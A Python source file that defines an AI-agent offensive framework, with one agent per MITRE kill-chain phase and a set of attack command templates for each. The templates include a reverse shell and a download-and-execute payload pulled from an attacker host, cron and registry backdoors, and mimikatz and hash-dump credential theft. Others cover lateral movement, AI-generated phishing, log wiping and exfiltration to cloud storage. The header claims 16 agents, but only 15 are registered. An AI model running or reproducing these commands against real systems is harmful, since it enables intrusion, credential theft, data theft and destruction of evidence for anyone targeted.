"""
16专家Agent编队 - 按MITRE Kill Chain分工
对标Decepticon的16个专家Agent架构
每个Agent有独立上下文、专用工具集、明确的Kill Chain阶段职责

Kill Chain阶段：
1. Reconnaissance (侦察) - scout, mapper, spider, fingerprinter
2. Initial Access (初始访问) - phisher, exploiter
3. Execution (执行) - runner, dropper
4. Persistence (持久化) - persister
5. Privilege Escalation (权限提升) - privesc
6. Defense Evasion (防御规避) - evader
7. Credential Access (凭据访问) - cred_hunter
8. Discovery (发现) - discoverer
9. Lateral Movement (横向移动) - lateral_mover
10. Collection (收集) - collector
11. Command and Control (C2) - c2_operator
12. Exfiltration (数据渗出) - exfiltrator
"""
import json
from dataclasses import dataclass, field
from typing import Optional, Callable
from enum import Enum


class KillChainPhase(Enum):
    """MITRE Kill Chain阶段"""
    RECONNAISSANCE = "reconnaissance"
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"


@dataclass
class AgentResult:
    """Agent执行结果"""
    agent_name: str
    phase: str
    status: str  # success/failed/skipped
    findings: list = field(default_factory=list)
    artifacts: list = field(default_factory=list)
    next_actions: list = field(default_factory=list)
    duration_seconds: float = 0.0
    error: Optional[str] = None


@dataclass
class AgentTool:
    """Agent可用工具"""
    name: str
    description: str
    command: str = ""
    requires_target: bool = True
    risk_level: str = "low"  # low/medium/high/critical


class BaseSpecialistAgent:
    """专家Agent基类"""

    name: str = "base"
    display_name: str = "Base Agent"
    phase: KillChainPhase = KillChainPhase.RECONNAISSANCE
    description: str = ""
    tools: list[AgentTool] = field(default_factory=list)
    system_prompt: str = ""

    def __init__(self, llm_client=None, tool_registry=None):
        self.llm_client = llm_client
        self.tool_registry = tool_registry
        self._context = []  # 独立上下文窗口
        self._findings = []

    async def execute(self, target: str, context: dict = None) -> AgentResult:
        """执行Agent任务（子类重写）"""
        return AgentResult(
            agent_name=self.name,
            phase=self.phase.value,
            status="skipped",
            findings=[],
            error="Not implemented",
        )

    def add_finding(self, finding: dict):
        """添加发现"""
        finding["source_agent"] = self.name
        finding["phase"] = self.phase.value
        self._findings.append(finding)

    def get_system_prompt(self) -> str:
        """获取系统提示词"""
        tools_desc = "\n".join([f"- {t.name}: {t.description}" for t in self.tools])
        return f"""你是{self.display_name}，属于Kill Chain的{self.phase.value}阶段。

角色描述：{self.description}

可用工具：
{tools_desc}

工作原则：
1. 只执行你职责范围内的任务
2. 所有操作记录到findings
3. 发现高价值目标时建议下一步行动
4. 保持操作的可复现性
"""

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "display_name": self.display_name,
            "phase": self.phase.value,
            "description": self.description,
            "tools_count": len(self.tools),
        }


# ============================================================
# 阶段1：侦察 (Reconnaissance) - 4个Agent
# ============================================================

class ScoutAgent(BaseSpecialistAgent):
    """侦察员 - 被动OSINT、WHOIS、证书透明度"""
    name = "scout"
    display_name = "侦察员 (Scout)"
    phase = KillChainPhase.RECONNAISSANCE
    description = "被动信息收集，不直接接触目标。包括WHOIS查询、DNS枚举、证书透明度日志、子域名被动收集、社交媒体情报。"
    tools = [
        AgentTool("whois", "WHOIS域名注册信息查询", "whois {target}"),
        AgentTool("subfinder", "被动子域名枚举", "subfinder -d {target} -silent"),
        AgentTool("amass", "深度DNS枚举", "amass enum -passive -d {target}"),
        AgentTool("crtsh", "证书透明度日志查询", "curl https://crt.sh/?q=%25.{target}"),
        AgentTool("theHarvester", "邮箱和子域名收集", "theHarvester -d {target} -b all"),
    ]


class MapperAgent(BaseSpecialistAgent):
    """测绘员 - 主动端口/服务扫描"""
    name = "mapper"
    display_name = "测绘员 (Mapper)"
    phase = KillChainPhase.RECONNAISSANCE
    description = "主动网络测绘，端口扫描、服务识别、操作系统指纹、网络拓扑发现。"
    tools = [
        AgentTool("nmap_tcp", "TCP全端口扫描", "nmap -p- -sV -sC {target}"),
        AgentTool("nmap_udp", "UDP常用端口扫描", "nmap -sU --top-ports 100 {target}"),
        AgentTool("masscan", "高速端口扫描", "masscan -p1-65535 {target} --rate=1000"),
        AgentTool("rustscan", "快速端口扫描", "rustscan -a {target} -- -sV"),
        AgentTool("naabu", "端口扫描", "naabu -host {target} -silent"),
    ]


class SpiderAgent(BaseSpecialistAgent):
    """爬虫 - Web爬取、API端点发现"""
    name = "spider"
    display_name = "爬虫 (Spider)"
    phase = KillChainPhase.RECONNAISSANCE
    description = "Web应用动态爬取，页面发现、表单提取、API端点发现、JavaScript分析。"
    tools = [
        AgentTool("katana", "智能Web爬虫", "katana -u https://{target} -jc -d 3"),
        AgentTool("gospider", "高速Web爬虫", "gospider -s https://{target} -d 3"),
        AgentTool("hakrawler", "链接爬取", "hakrawler -url https://{target} -depth 3"),
        AgentTool("linkfinder", "JS端点提取", "python linkfinder.py -i https://{target}"),
        AgentTool("playwright_crawl", "动态渲染爬虫（内置）", "browser.dynamic_crawler"),
    ]


class FingerprinterAgent(BaseSpecialistAgent):
    """指纹识别员 - OS/服务/框架/技术栈识别"""
    name = "fingerprinter"
    display_name = "指纹识别员 (Fingerprinter)"
    phase = KillChainPhase.RECONNAISSANCE
    description = "技术栈指纹识别，包括操作系统、Web服务器、应用框架、CMS、中间件、WAF识别。"
    tools = [
        AgentTool("whatweb", "Web技术指纹识别", "whatweb https://{target}"),
        AgentTool("wappalyzer", "技术栈分析", "wappalyzer https://{target}"),
        AgentTool("wafw00f", "WAF识别", "wafw00f https://{target}"),
        AgentTool("nmap_os", "操作系统指纹", "nmap -O {target}"),
        AgentTool("httpx", "HTTP服务探测", "httpx -u https://{target} -tech-detect"),
    ]


# ============================================================
# 阶段2：初始访问 (Initial Access) - 2个Agent
# ============================================================

class PhisherAgent(BaseSpecialistAgent):
    """钓鱼员 - 鱼叉式钓鱼活动制作"""
    name = "phisher"
    display_name = "钓鱼员 (Phisher)"
    phase = KillChainPhase.INITIAL_ACCESS
    description = "鱼叉式钓鱼活动设计，包括钓鱼邮件模板、伪装页面、社会工程学话术。仅用于授权的社会工程学评估。"
    tools = [
        AgentTool("gophish", "钓鱼平台", "gophish"),
        AgentTool("setoolkit", "社会工程学工具包", "setoolkit"),
        AgentTool("email_generator", "钓鱼邮件生成（AI辅助）", "ai.generate_phishing_email"),
    ]


class ExploiterAgent(BaseSpecialistAgent):
    """利用员 - CVE利用、漏洞验证"""
    name = "exploiter"
    display_name = "利用员 (Exploiter)"
    phase = KillChainPhase.INITIAL_ACCESS
    description = "漏洞利用执行，CVE漏洞验证、已知漏洞利用、Web漏洞利用（SQLi/XSS/RCE）。"
    tools = [
        AgentTool("nuclei", "漏洞模板扫描利用", "nuclei -u https://{target} -as"),
        AgentTool("sqlmap", "SQL注入利用", "sqlmap -u {target} --batch --dbs"),
        AgentTool("metasploit", "漏洞利用框架", "msfconsole -x 'use {exploit}; set RHOSTS {target}; run'"),
        AgentTool("searchsploit", "漏洞利用搜索", "searchsploit {service} {version}"),
        AgentTool("commix", "命令注入利用", "commix --url={target} --batch"),
    ]


# ============================================================
# 阶段3：执行 (Execution) - 1个Agent
# ============================================================

class ExecutionAgent(BaseSpecialistAgent):
    """执行员 - 命令执行、载荷投递、代码执行"""
    name = "execution"
    display_name = "执行员 (Execution)"
    phase = KillChainPhase.EXECUTION
    description = "在目标系统上执行命令和代码，包括反向Shell、WebShell、载荷投递、文件上传利用、远程命令执行。"
    tools = [
        AgentTool("reverse_shell", "反向Shell生成", "bash -i >& /dev/tcp/{attacker}/{port} 0>&1"),
        AgentTool("webshell", "WebShell上传执行", "webshell_manager"),
        AgentTool("impacket", "远程命令执行", "impacket-psexec {user}:{pass}@{target}"),
        AgentTool("crackmapexec", "横向命令执行", "crackmapexec smb {target} -u {user} -p {pass} -x 'cmd'"),
        AgentTool("msfvenom", "Payload生成", "msfvenom -p {payload} LHOST={attacker} LPORT={port} -f {format}"),
        AgentTool("upload_scanner", "文件上传漏洞扫描", "upload_scanner https://{target}/upload"),
        AgentTool("curl_download", "远程下载执行", "curl http://{attacker}/payload -o /tmp/p && chmod +x /tmp/p && /tmp/p"),
    ]


# ============================================================
# 阶段4：持久化 (Persistence) - 1个Agent
# ============================================================

class PersisterAgent(BaseSpecialistAgent):
    """持久化员 - 后门、启动项、计划任务"""
    name = "persister"
    display_name = "持久化员 (Persister)"
    phase = KillChainPhase.PERSISTENCE
    description = "建立持久化访问，包括计划任务、启动项、服务注册、SSH密钥、WebShell后门。"
    tools = [
        AgentTool("cron_backdoor", "Cron计划任务后门", "echo '* * * * * /tmp/backdoor' | crontab -"),
        AgentTool("ssh_key", "SSH公钥注入", "echo {pubkey} >> ~/.ssh/authorized_keys"),
        AgentTool("systemd_service", "Systemd服务后门", "systemctl enable backdoor.service"),
        AgentTool("registry_run", "Windows注册表启动项", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d {path}"),
    ]


# ============================================================
# 阶段5：权限提升 (Privilege Escalation) - 1个Agent
# ============================================================

class PrivescAgent(BaseSpecialistAgent):
    """提权员 - 本地权限提升"""
    name = "privesc"
    display_name = "提权员 (Privesc)"
    phase = KillChainPhase.PRIVILEGE_ESCALATION
    description = "本地权限提升，包括内核漏洞、SUID二进制、sudo配置错误、Windows提权。"
    tools = [
        AgentTool("linpeas", "Linux提权枚举", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
        AgentTool("winpeas", "Windows提权枚举", "winpeas.exe"),
        AgentTool("linux_exploit_suggester", "Linux内核漏洞建议", "linux-exploit-suggester.sh"),
        AgentTool("suid_check", "SUID二进制检查", "find / -perm -4000 -type f 2>/dev/null"),
        AgentTool("sudo_check", "Sudo配置检查", "sudo -l"),
    ]


# ============================================================
# 阶段6：防御规避 (Defense Evasion) - 1个Agent
# ============================================================

class EvaderAgent(BaseSpecialistAgent):
    """规避员 - 反检测、反取证、流量混淆"""
    name = "evader"
    display_name = "规避员 (Evader)"
    phase = KillChainPhase.DEFENSE_EVASION
    description = "防御规避，包括AV/EDR绕过、日志清理、流量加密混淆、反取证。"
    tools = [
        AgentTool("av_evasion", "免杀Payload生成", "veil-evasion"),
        AgentTool("log_cleaner", "日志清理", "log_cleaner"),
        AgentTool("traffic_encrypt", "流量加密隧道", "chisel server -p {port} --reverse"),
        AgentTool("process_hollow", "进程空心化", "process_hollowing"),
    ]


# ============================================================
# 阶段7：凭据访问 (Credential Access) - 1个Agent
# ============================================================

class CredHunterAgent(BaseSpecialistAgent):
    """凭据猎人 - 密码抓取、哈希传递"""
    name = "cred_hunter"
    display_name = "凭据猎人 (Cred Hunter)"
    phase = KillChainPhase.CREDENTIAL_ACCESS
    description = "凭据获取，包括密码抓取、哈希转储、Kerberos攻击、凭据复用。"
    tools = [
        AgentTool("mimikatz", "Windows凭据抓取", "mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
        AgentTool("hashdump", "哈希转储", "impacket-secretsdump {domain}/{user}:{pass}@{target}"),
        AgentTool("kerberoasting", "Kerberoasting攻击", "impacket-GetUserSPNs {domain}/{user}:{pass} -request"),
        AgentTool("asreproasting", "AS-REP Roasting", "impacket-GetNPUsers {domain}/ -usersfile users.txt -format hashcat"),
        AgentTool("hydra", "密码爆破", "hydra -L users.txt -P pass.txt {target} ssh"),
    ]


# ============================================================
# 阶段8：发现 (Discovery) - 1个Agent
# ============================================================

class DiscovererAgent(BaseSpecialistAgent):
    """发现员 - 内网信息收集、AD枚举"""
    name = "discoverer"
    display_name = "发现员 (Discoverer)"
    phase = KillChainPhase.DISCOVERY
    description = "内网信息发现，包括Active Directory枚举、网络共享、用户/组/计算机枚举、BloodHound数据收集。"
    tools = [
        AgentTool("bloodhound", "AD关系图谱收集", "bloodhound-python -d {domain} -u {user} -p {pass} -ns {dc} -c All"),
        AgentTool("sharphound", "Windows AD收集", "SharpHound.exe -c All"),
        AgentTool("ad_enum", "AD用户/组/计算机枚举", "impacket-GetADUsers {domain}/{user}:{pass} -all"),
        AgentTool("smb_shares", "SMB共享枚举", "smbclient -L //{target} -U {user}"),
        AgentTool("netdiscover", "内网主机发现", "netdiscover -r {subnet}"),
    ]


# ============================================================
# 阶段9：横向移动 (Lateral Movement) - 1个Agent
# ============================================================

class LateralMoverAgent(BaseSpecialistAgent):
    """横向移动员 - 内网横向渗透"""
    name = "lateral_mover"
    display_name = "横向移动员 (Lateral Mover)"
    phase = KillChainPhase.LATERAL_MOVEMENT
    description = "内网横向移动，包括Pass-the-Hash、Pass-the-Ticket、WMI/WinRM/PSExec远程执行。"
    tools = [
        AgentTool("pth", "哈希传递", "impacket-psexec -hashes {lm}:{nt} {domain}/{user}@{target}"),
        AgentTool("ptt", "票据传递", "impacket-ticketer"),
        AgentTool("wmiexec", "WMI远程执行", "impacket-wmiexec {user}:{pass}@{target}"),
        AgentTool("winrm", "WinRM远程执行", "evil-winrm -i {target} -u {user} -p {pass}"),
        AgentTool("ssh_lateral", "SSH横向移动", "ssh {user}@{target}"),
    ]


# ============================================================
# 阶段10：收集 (Collection) - 1个Agent
# ============================================================

class CollectorAgent(BaseSpecialistAgent):
    """收集员 - 数据收集、文件归档"""
    name = "collector"
    display_name = "收集员 (Collector)"
    phase = KillChainPhase.COLLECTION
    description = "敏感数据收集，包括配置文件、数据库、文档、浏览器密码、密钥文件。"
    tools = [
        AgentTool("config_grabber", "配置文件收集", "find /etc -name '*.conf' -o -name '*.config'"),
        AgentTool("db_dump", "数据库转储", "mysqldump -u {user} -p{pass} --all-databases > dump.sql"),
        AgentTool("browser_creds", "浏览器密码提取", "laZagne.exe browsers"),
        AgentTool("key_finder", "密钥文件搜索", "find / -name '*.key' -o -name '*.pem' -o -name 'id_rsa'"),
        AgentTool("doc_collector", "文档收集", "find /home -name '*.docx' -o -name '*.xlsx' -o -name '*.pdf'"),
    ]


# ============================================================
# 阶段11：命令与控制 (C2) - 1个Agent
# ============================================================

class C2OperatorAgent(BaseSpecialistAgent):
    """C2操作员 - 命令控制、会话管理"""
    name = "c2_operator"
    display_name = "C2操作员 (C2 Operator)"
    phase = KillChainPhase.COMMAND_AND_CONTROL
    description = "命令与控制管理，包括C2框架操作、会话管理、流量隧道、多会话协调。"
    tools = [
        AgentTool("sliver", "Sliver C2框架", "sliver"),
        AgentTool("cobalt_strike", "Cobalt Strike（商业）", "cs_teamserver"),
        AgentTool("chisel", "TCP/UDP隧道", "chisel client {attacker}:{port} R:socks"),
        AgentTool("frp", "内网穿透", "frpc -c frpc.ini"),
        AgentTool("meterpreter", "Meterpreter会话管理", "msfconsole -x 'sessions -l'"),
    ]


# ============================================================
# 阶段12：数据渗出 (Exfiltration) - 1个Agent
# ============================================================

class ExfiltratorAgent(BaseSpecialistAgent):
    """渗出员 - 数据外传、痕迹清理"""
    name = "exfiltrator"
    display_name = "渗出员 (Exfiltrator)"
    phase = KillChainPhase.EXFILTRATION
    description = "数据渗出，包括加密压缩、DNS/HTTPS隐蔽通道、云存储外传、痕迹清理。"
    tools = [
        AgentTool("data_pack", "数据加密压缩", "tar czf - /data | openssl enc -aes-256-cbc -out exfil.tar.gz.enc"),
        AgentTool("dns_exfil", "DNS隐蔽通道渗出", "iodine"),
        AgentTool("cloud_exfil", "云存储上传", "curl -T exfil.tar.gz https://{bucket}.s3.amazonaws.com/"),
        AgentTool("trace_cleaner", "操作痕迹清理", "history -c && rm -rf ~/.bash_history /var/log/*"),
    ]


# ============================================================
# Agent注册表
# ============================================================

ALL_SPECIALIST_AGENTS = [
    # 侦察 (4)
    ScoutAgent, MapperAgent, SpiderAgent, FingerprinterAgent,
    # 初始访问 (2)
    PhisherAgent, ExploiterAgent,
    # 执行 (2)
    ExecutionAgent,
    # 持久化 (1)
    PersisterAgent,
    # 权限提升 (1)
    PrivescAgent,
    # 防御规避 (1)
    EvaderAgent,
    # 凭据访问 (1)
    CredHunterAgent,
    # 发现 (1)
    DiscovererAgent,
    # 横向移动 (1)
    LateralMoverAgent,
    # 收集 (1)
    CollectorAgent,
    # C2 (1)
    C2OperatorAgent,
    # 渗出 (1)
    ExfiltratorAgent,
]

# 按阶段分组
AGENTS_BY_PHASE = {}
for agent_cls in ALL_SPECIALIST_AGENTS:
    phase = agent_cls.phase.value
    if phase not in AGENTS_BY_PHASE:
        AGENTS_BY_PHASE[phase] = []
    AGENTS_BY_PHASE[phase].append(agent_cls)


def get_agent_by_name(name: str) -> Optional[type]:
    """按名称获取Agent类"""
    for agent_cls in ALL_SPECIALIST_AGENTS:
        if agent_cls.name == name:
            return agent_cls
    return None


def list_all_agents() -> list[dict]:
    """列出所有Agent信息"""
    return [
        {
            "name": cls.name,
            "display_name": cls.display_name,
            "phase": cls.phase.value,
            "description": cls.description,
            "tools_count": len(cls.tools),
        }
        for cls in ALL_SPECIALIST_AGENTS
    ]


if __name__ == "__main__":
    print(f"16专家Agent编队 - 对标Decepticon架构")
    print(f"总Agent数: {len(ALL_SPECIALIST_AGENTS)}")
    print(f"Kill Chain阶段数: {len(AGENTS_BY_PHASE)}")
    print()
    for phase, agents in AGENTS_BY_PHASE.items():
        print(f"【{phase}】({len(agents)}个)")
        for a in agents:
            print(f"  - {a.name}: {a.display_name} ({len(a.tools)}工具)")
        print()
